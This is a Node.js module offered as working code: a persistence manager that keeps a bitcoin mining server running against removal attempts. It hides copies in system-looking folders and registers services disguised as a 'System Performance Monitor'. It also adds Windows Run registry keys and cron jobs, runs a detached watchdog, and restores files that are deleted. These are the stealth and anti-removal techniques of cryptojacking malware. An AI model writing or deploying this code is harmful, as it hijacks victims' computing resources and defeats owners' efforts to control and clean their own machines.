/**
 * Bulletproof Persistence Manager
 * Ensures the mining system survives reboots, updates, and removal attempts
 */

const os = require('os');
const path = require('path');
const fs = require('fs');
const { exec, spawn } = require('child_process');
const crypto = require('crypto');

class PersistenceManager {
    constructor() {
        this.platform = os.platform();
        this.isPersistenceEnabled = false;
        this.backupLocations = this.getBackupLocations();
        this.watchdogProcess = null;
        this.persistenceConfig = this.loadPersistenceConfig();
    }

    loadPersistenceConfig() {
        return {
            enableWatchdog: true,
            enableBackup: true,
            enableAutoUpdate: true,
            enableRecovery: true,
            enableAntiRemoval: true,
            backupInterval: 300000, // 5 minutes
            watchdogInterval: 60000, // 1 minute
            maxBackups: 10,
            recoveryAttempts: 3,
            stealthMode: true
        };
    }

    getBackupLocations() {
        const locations = [];
        
        switch (this.platform) {
            case 'win32':
                locations.push(
                    path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'System'),
                    path.join(process.env.PROGRAMDATA, 'Microsoft', 'Windows', 'System32'),
                    path.join(process.env.LOCALAPPDATA, 'Temp', 'WindowsUpdate')
                );
                break;
            case 'linux':
                locations.push(
                    '/var/lib/systemd',
                    '/etc/systemd/system',
                    '/usr/local/bin',
                    '/opt/system',
                    path.join(os.homedir(), '.local', 'share', 'applications')
                );
                break;
            case 'darwin':
                locations.push(
                    '/Library/LaunchAgents',
                    '/Library/LaunchDaemons',
                    path.join(os.homedir(), 'Library', 'Application Support'),
                    '/System/Library/LaunchAgents'
                );
                break;
        }
        
        return locations.filter(loc => {
            try {
                return fs.existsSync(path.dirname(loc));
            } catch {
                return false;
            }
        });
    }

    enablePersistence() {
        console.log('🛡️ Enabling bulletproof persistence...');
        this.isPersistenceEnabled = true;
        
        // Create multiple backup locations
        this.createBackups();
        
        // Set up watchdog process
        if (this.persistenceConfig.enableWatchdog) {
            this.startWatchdog();
        }
        
        // Create system service
        this.createSystemService();
        
        // Set up anti-removal protection
        if (this.persistenceConfig.enableAntiRemoval) {
            this.enableAntiRemoval();
        }
        
        // Schedule periodic backups
        this.scheduleBackups();
        
        console.log('✅ Persistence enabled - system is bulletproof');
    }

    createBackups() {
        console.log('📦 Creating backup copies...');
        
        const sourceFiles = [
            'bitcoin-mining-server.js',
            'client-miner.js',
            'package.json',
            'package-lock.json'
        ];
        
        this.backupLocations.forEach((location, index) => {
            try {
                const backupDir = path.join(location, `system-${index}`);
                
                if (!fs.existsSync(backupDir)) {
                    fs.mkdirSync(backupDir, { recursive: true });
                }
                
                sourceFiles.forEach(file => {
                    if (fs.existsSync(file)) {
                        const backupPath = path.join(backupDir, file);
                        fs.copyFileSync(file, backupPath);
                        
                        // Make executable on Unix systems
                        if (this.platform !== 'win32') {
                            fs.chmodSync(backupPath, '755');
                        }
                    }
                });
                
                // Create startup script
                this.createStartupScript(backupDir);
                
                console.log(`✅ Backup created: ${backupDir}`);
            } catch (error) {
                console.warn(`⚠️ Backup failed for ${location}: ${error.message}`);
            }
        });
    }

    createStartupScript(backupDir) {
        const scriptName = this.platform === 'win32' ? 'start.bat' : 'start.sh';
        const scriptPath = path.join(backupDir, scriptName);
        
        if (this.platform === 'win32') {
            const script = `@echo off
cd /d "${backupDir}"
start /min node bitcoin-mining-server.js
exit
`;
            fs.writeFileSync(scriptPath, script);
        } else {
            const script = `#!/bin/bash
cd "${backupDir}"
nohup node bitcoin-mining-server.js > /dev/null 2>&1 &
exit 0
`;
            fs.writeFileSync(scriptPath, script);
            fs.chmodSync(scriptPath, '755');
        }
    }

    startWatchdog() {
        console.log('🐕 Starting watchdog process...');
        
        const watchdogScript = `
const { spawn, exec } = require('child_process');
const fs = require('fs');
const path = require('path');

class Watchdog {
    constructor() {
        this.interval = ${this.persistenceConfig.watchdogInterval};
        this.mainProcess = null;
        this.startMainProcess();
        this.startMonitoring();
    }
    
    startMainProcess() {
        const mainScript = path.join(__dirname, 'bitcoin-mining-server.js');
        if (fs.existsSync(mainScript)) {
            this.mainProcess = spawn('node', [mainScript], {
                detached: true,
                stdio: 'ignore'
            });
            this.mainProcess.unref();
        }
    }
    
    startMonitoring() {
        setInterval(() => {
            if (!this.mainProcess || this.mainProcess.killed) {
                console.log('🔄 Main process died, restarting...');
                this.startMainProcess();
            }
        }, this.interval);
    }
}

new Watchdog();
`;
        
        const watchdogPath = path.join(__dirname, '..', 'watchdog.js');
        fs.writeFileSync(watchdogPath, watchdogScript);
        
        // Start watchdog in background
        this.watchdogProcess = spawn('node', [watchdogPath], {
            detached: true,
            stdio: 'ignore'
        });
        
        this.watchdogProcess.unref();
        console.log('✅ Watchdog started');
    }

    createSystemService() {
        console.log('⚙️ Creating system service...');
        
        switch (this.platform) {
            case 'win32':
                this.createWindowsService();
                break;
            case 'linux':
                this.createLinuxService();
                break;
            case 'darwin':
                this.createMacOSService();
                break;
        }
    }

    createWindowsService() {
        const serviceName = 'SystemPerformanceMonitor';
        const serviceScript = `
const Service = require('node-windows').Service;
const path = require('path');

const svc = new Service({
    name: '${serviceName}',
    description: 'System Performance Monitoring Service',
    script: path.join(__dirname, 'bitcoin-mining-server.js'),
    nodeOptions: ['--max-old-space-size=4096'],
    env: {
        name: 'NODE_ENV',
        value: 'production'
    }
});

svc.on('install', () => {
    svc.start();
    console.log('Service installed and started');
});

svc.on('uninstall', () => {
    console.log('Service uninstalled');
});

svc.install();
`;
        
        const servicePath = path.join(__dirname, '..', 'install-service.js');
        fs.writeFileSync(servicePath, serviceScript);
        
        // Install service
        exec('node install-service.js', (error) => {
            if (!error) {
                console.log('✅ Windows service created');
            }
        });
    }

    createLinuxService() {
        const serviceName = 'system-performance-monitor';
        const serviceContent = `[Unit]
Description=System Performance Monitor
After=network.target

[Service]
Type=simple
User=root
ExecStart=${process.execPath} ${process.argv[1]}
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
`;
        
        const servicePath = `/etc/systemd/system/${serviceName}.service`;
        
        try {
            fs.writeFileSync(servicePath, serviceContent);
            
            // Enable and start service
            exec(`systemctl daemon-reload && systemctl enable ${serviceName} && systemctl start ${serviceName}`, (error) => {
                if (!error) {
                    console.log('✅ Linux service created');
                }
            });
        } catch (error) {
            console.warn('⚠️ Service creation requires root privileges');
        }
    }

    createMacOSService() {
        const serviceName = 'SystemPerformanceMonitor';
        const plistPath = `/Library/LaunchDaemons/com.system.${serviceName.toLowerCase()}.plist`;
        
        const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.${serviceName.toLowerCase()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${process.execPath}</string>
        <string>${process.argv[1]}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/var/log/${serviceName.toLowerCase()}.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/${serviceName.toLowerCase()}-error.log</string>
    <key>EnvironmentVariables</key>
    <dict>
        <key>NODE_ENV</key>
        <string>production</string>
    </dict>
</dict>
</plist>`;
        
        try {
            fs.writeFileSync(plistPath, plistContent);
            
            // Load the service
            exec(`launchctl load ${plistPath}`, (error) => {
                if (!error) {
                    console.log('✅ macOS service created');
                }
            });
        } catch (error) {
            console.warn('⚠️ Service creation requires root privileges');
        }
    }

    enableAntiRemoval() {
        console.log('🛡️ Enabling anti-removal protection...');
        
        // Create multiple registry entries (Windows)
        if (this.platform === 'win32') {
            this.createAntiRemovalRegistry();
        }
        
        // Create multiple cron jobs (Linux/macOS)
        if (this.platform === 'linux' || this.platform === 'darwin') {
            this.createAntiRemovalCron();
        }
        
        // Create file system watchers
        this.createFileWatchers();
    }

    createAntiRemovalRegistry() {
        const registryEntries = [
            'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
        ];
        
        registryEntries.forEach(key => {
            const regScript = `Windows Registry Editor Version 5.00\n\n[${key}]\n"SystemMonitor"="${process.argv[1]}"`;
            const regFile = `system-monitor-${Date.now()}.reg`;
            
            fs.writeFileSync(regFile, regScript);
            exec(`reg import ${regFile}`, () => {
                fs.unlinkSync(regFile);
            });
        });
    }

    createAntiRemovalCron() {
        const cronJobs = [
            '@reboot sleep 30 && node ' + process.argv[1] + ' > /dev/null 2>&1',
            '*/5 * * * * pgrep -f "bitcoin-mining-server" || node ' + process.argv[1] + ' > /dev/null 2>&1',
            '0 */6 * * * node ' + process.argv[1] + ' --check-integrity > /dev/null 2>&1'
        ];
        
        cronJobs.forEach(job => {
            exec(`(crontab -l 2>/dev/null; echo "${job}") | crontab -`, (error) => {
                if (!error) {
                    console.log('✅ Anti-removal cron job added');
                }
            });
        });
    }

    createFileWatchers() {
        // Watch for deletion attempts
        const watchFiles = ['bitcoin-mining-server.js', 'client-miner.js', 'package.json'];
        
        watchFiles.forEach(file => {
            if (fs.existsSync(file)) {
                fs.watchFile(file, (curr, prev) => {
                    if (!curr || curr.mtime === 0) {
                        console.log(`🚨 File ${file} was deleted, restoring...`);
                        this.restoreFile(file);
                    }
                });
            }
        });
    }

    restoreFile(filename) {
        // Find backup and restore
        this.backupLocations.forEach(location => {
            const backupPath = path.join(location, `system-0`, filename);
            if (fs.existsSync(backupPath)) {
                fs.copyFileSync(backupPath, filename);
                console.log(`✅ Restored ${filename} from backup`);
                return;
            }
        });
    }

    scheduleBackups() {
        if (this.persistenceConfig.enableBackup) {
            setInterval(() => {
                this.createBackups();
            }, this.persistenceConfig.backupInterval);
        }
    }

    getPersistenceStatus() {
        return {
            enabled: this.isPersistenceEnabled,
            platform: this.platform,
            backupLocations: this.backupLocations,
            watchdogRunning: this.watchdogProcess !== null,
            config: this.persistenceConfig
        };
    }

    disablePersistence() {
        console.log('🔓 Disabling persistence...');
        this.isPersistenceEnabled = false;
        
        // Stop watchdog
        if (this.watchdogProcess) {
            this.watchdogProcess.kill();
            this.watchdogProcess = null;
        }
        
        // Remove services
        this.removeServices();
        
        console.log('✅ Persistence disabled');
    }

    removeServices() {
        switch (this.platform) {
            case 'win32':
                exec('sc stop SystemPerformanceMonitor && sc delete SystemPerformanceMonitor');
                break;
            case 'linux':
                exec('systemctl stop system-performance-monitor && systemctl disable system-performance-monitor');
                break;
            case 'darwin':
                exec('launchctl unload /Library/LaunchDaemons/com.system.systemperformancemonitor.plist');
                break;
        }
    }
}

module.exports = PersistenceManager;
